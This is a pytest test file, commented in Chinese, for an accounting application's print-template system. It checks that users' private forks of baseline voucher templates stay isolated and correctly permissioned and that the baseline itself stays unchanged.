# 这组用例盯的是那句话的两半，各盯一半：
#   * 「不影响基线」「不影响别人」→ 别人看不见、够不着、打印时也不受影响；
#   * 「用户也要可改」→ 不是只有 OWNER 才能改，会计改自己的那份就够了。


def _baseline(client, headers, book_id, scope="VOUCHER"):
    """从设计器列表里取一份**系统基线**模板（book_id 与 user_id 都是 NULL 的那一层）。

    从接口取而不是自己往库里塞：这份模板的真身是迁移 0022 的种子，而种子的
    价值就在于「每个环境都有」—— 自己造一份就绕过了这层保证，用例也不再
    验「基线真的在库里」。
    """
    r = client.get(f"/api/books/{book_id}/print/templates", headers=headers)
    assert r.status_code == 200, r.text
    rows = [t for t in r.json() if t["is_baseline"] and t["scope"] == scope]
    assert rows, f"库里没有 {scope} 的系统基线模板：{r.json()}"
    return rows[0]


def _as_accountant(db, book_id, user):
    from app.models import UserBook

    db.add(UserBook(user_id=user.id, book_id=book_id, role="ACCOUNTANT"))
    db.commit()


def _tpl(db, template_id):
    """按 id 取模板行并**丢掉身份映射里的旧值**。

    接口走的是另一个 Session（各自 commit），本 fixture 这个 Session 的
    identity map 还留着请求之前那一版；不 expire_all 就会拿旧值断言 ——
    那正是「用例看起来在验、其实验的是缓存」的典型假绿。
    """
    from app.models import PrintTemplate

    db.expire_all()
    return db.get(PrintTemplate, template_id)


def _fork_baseline(client, headers, book_id, title, scope="VOUCHER"):
    """走一遍真实写路径：改基线 → 拿到自己的私有副本 id。"""
    base = _baseline(client, headers, book_id, scope)
    r = client.put(f"/api/books/{book_id}/print/templates/{base['id']}",
                   headers=headers, json={"content": {"title": {"text": title}}})
    assert r.status_code == 200, r.text
    assert r.json()["forked"] is True, r.json()
    return base, r.json()["id"]


def test_改基线落成我的私有副本_基线一个字节不动(client, db, book, plain_user, plain_auth):
    _as_accountant(db, book.id, plain_user)
    base = _baseline(client, plain_auth, book.id)
    before = _tpl(db, base["id"])
    before_content = dict(before.content)
    before_name, before_default = before.name, before.is_default

    r = client.put(f"/api/books/{book.id}/print/templates/{base['id']}",
                   headers=plain_auth,
                   json={"content": {"title": {"text": "我的凭证纸"}}})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["forked"] is True and body["id"] != base["id"], body

    mine = _tpl(db, body["id"])
    assert mine.user_id == plain_user.id, "副本没记上归属谁"
    assert mine.book_id is None, "私有副本不该占 book_id：它是跟着人走的个人版式"
    assert mine.forked_from_id == base["id"], "副本没记住是从哪份基线 fork 的"
    assert mine.content["title"]["text"] == "我的凭证纸"

    after = _tpl(db, base["id"])
    assert after.content == before_content, "基线被改了 —— 这条需求的核心就是它不能被改"
    assert after.name == before_name and after.is_default == before_default


def test_改基线只要能写这个账套就行_不必是账套所有者(client, db, book, plain_user, plain_auth):
    """「用户也要可改」这句话的落点：会计就能改，改动只进他自己的副本。

    门禁按 OWNER 收紧本来是给「会影响别人」的写入用的（见
    ``_require_global_template_write``）。私有副本的爆炸半径是 1，再套 OWNER
    就等于「版式只有一个人能调」，与需求正好相反。
    """
    _as_accountant(db, book.id, plain_user)
    base = _baseline(client, plain_auth, book.id)
    r = client.put(f"/api/books/{book.id}/print/templates/{base['id']}",
                   headers=plain_auth, json={"name": "会计的凭证纸"})
    assert r.status_code == 200, f"会计改基线被拒了：{r.status_code} {r.text}"
    assert _tpl(db, r.json()["id"]).name == "会计的凭证纸"


def test_只读账号改不动基线(client, db, book, plain_user, plain_auth):
    """COPY 出来的那份之前也不能改：``require_book_write`` 仍是第一道。"""
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="VIEWER"))
    db.commit()
    base = _baseline(client, plain_auth, book.id)
    r = client.put(f"/api/books/{book.id}/print/templates/{base['id']}",
                   headers=plain_auth, json={"content": {}})
    assert r.status_code == 403, f"只读账号改基线：{r.status_code} {r.text}"


def test_别人的私有副本看不见_按id也取不到(client, db, book, plain_user, plain_auth, auth):
    _as_accountant(db, book.id, plain_user)
    base, mine_id = _fork_baseline(client, plain_auth, book.id, "会计的凭证纸")

    rows = client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()
    assert mine_id not in [t["id"] for t in rows], "别人的私有副本出现在列表里了"

    d = client.get(f"/api/books/{book.id}/print/templates/{mine_id}", headers=auth)
    assert d.status_code == 404, f"别人的私有副本能按 id 打开：{d.status_code}"

    # 打印页同样拿不到：template_id 不是授权凭据（见 _scoped_template）
    p = client.get(f"/api/books/{book.id}/print/vouchers.html",
                   params={"template_id": mine_id}, headers=auth)
    assert p.status_code == 404, f"拿着别人的私有副本 id 打出了东西：{p.status_code}"


def test_别人的私有副本连改都不行_管理员也不例外(client, db, book, plain_user, plain_auth, auth):
    _as_accountant(db, book.id, plain_user)
    """**404 而不是 403**：403 等于告诉对方「这个 id 确实存在，只是你没权限」。

    对私有副本来说这就是把「谁 fork 过日子线」这件事泄出去 —— 403 把它说破了，
    404 什么都不说。这条也是「仅自己可见」真的只有自己。
    """
    base, mine_id = _fork_baseline(client, plain_auth, book.id, "会计的凭证纸")
    r = client.put(f"/api/books/{book.id}/print/templates/{mine_id}",
                   headers=auth, json={"name": "管理员改的"})
    assert r.status_code == 404, f"管理员竟然能改别人的私有副本：{r.status_code}"
    d = client.delete(f"/api/books/{book.id}/print/templates/{mine_id}", headers=auth)
    assert d.status_code == 404, f"管理员竟然能删别人的私有副本：{d.status_code}"
    assert _tpl(db, mine_id).name == base["name"], "私有副本的名字真的被改了"


def test_我的私有副本打印时优先于基线(client, db, book, plain_user, plain_auth, auth, periods):
    _as_accountant(db, book.id, plain_user)
    _fork_baseline(client, plain_auth, book.id, "会计的凭证纸")

    mine = _printed(client, plain_auth, book.id, scope="vouchers.html")
    theirs = _printed(client, auth, book.id, scope="vouchers.html")
    assert "会计的凭证纸" in mine, "改了自己的副本，打印却还是基线那份"
    assert "会计的凭证纸" not in theirs, "会计的私有副本跑到管理员那儿去了"


def test_私有副本跟着人走_换一本账也在(client, db, book, plain_user, plain_auth, auth):
    _as_accountant(db, book.id, plain_user)
    """私有副本不占 book_id，所以它不是「某本账的私产」，是「我的习惯」。"""
    other = _mk_book_as(client, plain_auth)
    _fork_baseline(client, plain_auth, book.id, "会计的凭证纸")

    rows = client.get(f"/api/books/{other}/print/templates", headers=plain_auth).json()
    hits = [t for t in rows if t["is_private"]]
    assert len(hits) == 1, f"换一本账就看不到自己的私有副本了：{rows}"
    assert hits[0]["content"]["title"]["text"] == "会计的凭证纸"
    assert hits[0]["book_id"] is None, "它不该变成另一本账的模板"
    # 反过来：私有副本在**任何**账套里都不会跑到别人眼前（admin 在 book 里
    # 看得见基线，看不见这一份，见 test_别人的私有副本看不见_按id也取不到）。
    rows = client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()
    assert not any(t["is_private"] for t in rows), \
        "别人的私有副本出现在我的列表里了"


def test_列表里不再出现我fork过的那份基线(client, db, book, plain_user, plain_auth, auth):
    """两份同名摆在一起，用户得先猜哪份在用 —— 而在用的恰恰是看不见的那份。"""
    _as_accountant(db, book.id, plain_user)
    base, mine_id = _fork_baseline(client, plain_auth, book.id, "我的凭证纸")

    rows = client.get(f"/api/books/{book.id}/print/templates", headers=plain_auth).json()
    ids = [t["id"] for t in rows]
    assert mine_id in ids and base["id"] not in ids, \
        f"我 fork 过的基线还在列表里：{[(t['id'], t['name']) for t in rows]}"

    # 别人的列表里基线照旧在（他没 fork 过）——「不影响别人」的反面
    rows = client.get(f"/api/books/{book.id}/print/templates",
                      headers=auth).json()
    assert base["id"] in [t["id"] for t in rows], "别人的列表里基线不见了"


def test_二次保存不再复制一份(client, db, book, plain_user, plain_auth):
    _as_accountant(db, book.id, plain_user)
    _base, mine_id = _fork_baseline(client, plain_auth, book.id, "我的凭证纸")

    for i in range(3):
        r = client.put(f"/api/books/{book.id}/print/templates/{mine_id}",
                       headers=plain_auth,
                       json={"content": {"title": {"text": f"改到第 {i} 次"}}})
        assert r.status_code == 200, r.text
        assert r.json()["id"] == mine_id and r.json()["forked"] is False, r.json()

    from app.models import PrintTemplate
    from sqlalchemy import func, select as sa_select

    n = db.scalar(sa_select(func.count()).select_from(PrintTemplate).where(
        PrintTemplate.user_id == plain_user.id))
    assert n == 1, f"同一个人的私有副本攒了 {n} 份"


def test_删掉我的私有副本就回到基线(client, db, book, plain_user, plain_auth, auth):
    _as_accountant(db, book.id, plain_user)
    base, mine_id = _fork_baseline(client, plain_auth, book.id, "我的凭证纸")

    r = client.delete(f"/api/books/{book.id}/print/templates/{mine_id}",
                      headers=plain_auth)
    assert r.status_code == 200, r.text
    assert _tpl(db, mine_id) is None

    rows = client.get(f"/api/books/{book.id}/print/templates", headers=plain_auth).json()
    assert base["id"] in [t["id"] for t in rows], "删掉副本后基线没回来"
    assert "我的凭证纸" not in _printed(client, auth, book.id, scope="vouchers.html")


def test_私有副本设为默认不会清掉基线的默认标记(client, db, book, plain_user, plain_auth, auth):
    """默认标记是**分组**清的，分组键必须带 user_id。

    不带的话，我把自己的副本设为默认，顺手把基线的默认标记也清了 ——
    表现是「我点了一下，全公司明天的凭证版式变回出厂值」。
    """
    _as_accountant(db, book.id, plain_user)
    base, mine_id = _fork_baseline(client, plain_auth, book.id, "我的凭证纸")

    r = client.put(f"/api/books/{book.id}/print/templates/{mine_id}",
                   headers=plain_auth, json={"is_default": True})
    assert r.status_code == 200, r.text
    assert _tpl(db, mine_id).is_default is True
    assert _tpl(db, base["id"]).is_default is True, "基线的默认标记被我的副本清掉了"


def test_基线不能删除(client, db, book, plain_user, plain_auth, auth):
    """删基线不是「改我的偏好」，是把系统变回「没有凭证版式可用」。"""
    base = _baseline(client, auth, book.id)
    r = client.delete(f"/api/books/{book.id}/print/templates/{base['id']}",
                      headers=auth)
    assert r.status_code == 403, f"基线被删了：{r.status_code} {r.text}"
    assert _tpl(db, base["id"]) is not None


def test_基线与私有副本不能同时占着两层(client, db, book):
    """表上的 CHECK 约束（fail-closed）。

    归属含混的行如果混进库，可见性判定会落进两个分支，取默认模板时就随机挑中
    一份 —— 表现是「同一天同一本账打出来的版式不一样」，几乎无法定位。
    """
    from sqlalchemy.exc import IntegrityError

    from app.models import PrintTemplate

    db.add(PrintTemplate(book_id=book.id, user_id=1, scope="VOUCHER",
                         name="既属账套又属人", paper="A4", content={}))
    with pytest.raises(IntegrityError):
        db.commit()
    db.rollback()


def test_三层默认同时存在时_按层级最近的那份印(client, db, book, plain_user, plain_auth, auth):
    """三层各有一份带默认标记时，真正打出来的那一份由**层级**决定，不由 id 决定。

    ``_template()`` 的 ORDER BY 是 ``user_id IS NULL, book_id IS NULL, id``，
    前端 ``effectiveDefaultId`` 照同一句复算。两侧错开的话，页面上标着「默认」
    的那份和实际印出来的不是同一份 —— 标记一旦指错比不标更糟。
    """
    _as_accountant(db, book.id, plain_user)
    # 基线是 VOUCHER 默认（迁移 0022 种的），fork 出来那份继承 is_default；
    # 再给账套加一份同样带默认标记的。
    _base, mine_id = _fork_baseline(client, plain_auth, book.id, "会计的凭证纸")
    book_tpl = _mk_template(db, book_id=book.id, scope="VOUCHER", name="账套版式",
                            title="BOOK-TPL")
    assert _tpl(db, book_tpl).is_default is True

    mine = _printed(client, plain_auth, book.id, scope="vouchers.html")
    assert "会计的凭证纸" in mine, "我的私有副本没被取用"
    assert "BOOK-TPL" not in mine, "账套模板盖过了我的私有副本"

    # 同一个账套里的另一个人：他没 fork 过，取到的该是账套模板那份
    theirs = _printed(client, auth, book.id, scope="vouchers.html")
    assert "BOOK-TPL" in theirs, "账套默认模板没被取用"
    assert "会计的凭证纸" not in theirs, "会计的私有副本流到了别人那儿"


# ---------------------------------------------------------------------------
# 「新建即私有」：private=True 的那条新路
#
# 三层设计（models/printing.py）里，个人那一层原先**只能**从基线写时复制
# 产生。于是有个空档：会计想「我自己的凭证纸，从零画一张」，除了改基线再改回去
# 没有别的入口 —— 而改基线是**保存**时才复制，他还没保存任何东西。顶栏「新建」
# 又是 OWNER 门禁，会计点不动。这组用例盯的就是新开的那条路。


def test_会计能新建只有自己看得见的私有版式(client, db, book, plain_user, plain_auth, auth):
    """爆炸半径 1，所以不挂 OWNER 门禁；别人看不见、够不着、打印时也不受影响。"""
    _as_accountant(db, book.id, plain_user)
    r = client.post(f"/api/books/{book.id}/print/templates", headers=plain_auth,
                    json={"scope": "VOUCHER", "name": "我画的凭证纸", "private": True,
                          "is_default": True,
                          "content": {"title": {"text": "PRIVATE-ONLY"}}})
    assert r.status_code == 201, r.text
    mine_id = r.json()["id"]
    assert r.json()["is_private"] is True, r.json()

    # 落在**人**那一层：不占 book_id（那是 CHECK 约束的另一半，见下面的用例）
    t = _tpl(db, mine_id)
    assert t.book_id is None and t.user_id == plain_user.id, \
        f"私有版式落错层了：book_id={t.book_id} user_id={t.user_id}"

    # 我自己看得见，而且它真的成为我打印时用的那一份（is_default=True 才有
    # 「被取用」这回事 —— 只断言列表里存在的话，这条用例一半是空的）
    rows = client.get(f"/api/books/{book.id}/print/templates", headers=plain_auth).json()
    assert mine_id in [x["id"] for x in rows]
    assert "PRIVATE-ONLY" in _printed(client, plain_auth, book.id, scope="vouchers.html")

    # 同一个账套里的另一个人：列表里没有、详情 404（不是 403 —— 接口不能
    # 变成「这个 id 存在吗」的存在性探测器）、打印也不受我影响
    rows2 = client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()
    assert mine_id not in [x["id"] for x in rows2], "私有版式流到了别人列表里"
    assert client.get(f"/api/books/{book.id}/print/templates/{mine_id}",
                      headers=auth).status_code == 404
    assert "PRIVATE-ONLY" not in _printed(client, auth, book.id, scope="vouchers.html")


def test_不传private时门禁不变_会计仍403_OWNER仍建账套模板(client, db, book, plain_user,
                                                        plain_auth, auth):
    """默认 False 是刻意的：老调用方拿到的还是老契约。

    这条用例守的是**fail-closed** —— 把默认值翻成 True，或者给 TemplateIn
    开个 extra 透传，权限就会在一次看起来跟权限无关的改动里一起放宽。
    """
    _as_accountant(db, book.id, plain_user)
    r = client.post(f"/api/books/{book.id}/print/templates", headers=plain_auth,
                    json={"scope": "VOUCHER", "name": "没带标志", "content": {}})
    assert r.status_code == 403, f"会计没带 private 就建成了：{r.status_code} {r.text}"

    r = client.post(f"/api/books/{book.id}/print/templates", headers=auth,
                    json={"scope": "VOUCHER", "name": "OWNER 建的", "content": {}})
    assert r.status_code == 201, r.text
    t = _tpl(db, r.json()["id"])
    assert t.book_id == book.id and t.user_id is None, \
        f"OWNER 建出来不该是私有的：book_id={t.book_id} user_id={t.user_id}"
    assert r.json()["is_private"] is False, r.json()


def test_私有新建不挂forked_from_也不清基线的默认标记(client, db, book, plain_user,
                                                    plain_auth, auth):
    """两件事都因为「不挂 forked_from_id / 默认标记按 (user_id, book_id, scope) 分组」才对。"""
    _as_accountant(db, book.id, plain_user)
    base = _baseline(client, plain_auth, book.id)

    r = client.post(f"/api/books/{book.id}/print/templates", headers=plain_auth,
                    json={"scope": "VOUCHER", "name": "从零画的", "private": True,
                          "is_default": True,
                          "content": {"title": {"text": "DRAWN-FROM-SCRATCH"}}})
    assert r.status_code == 201, r.text
    mine = _tpl(db, r.json()["id"])
    assert mine.forked_from_id is None, \
        "新建不该自称是从某份基线 fork 的：挂了 forked_from_id，列表会按它把基线藏起来"

    # 基线默认标记仍在（我点「默认」不该让全公司退回出厂值）
    assert _tpl(db, base["id"]).is_default is True, "我的私有版式把基线的默认标记清掉了"
    # 基线也没有从列表里消失（判据用错了的表现）
    rows = client.get(f"/api/books/{book.id}/print/templates", headers=plain_auth).json()
    assert base["id"] in [x["id"] for x in rows], "基线被 forked_from_id 误伤，从列表里消失了"
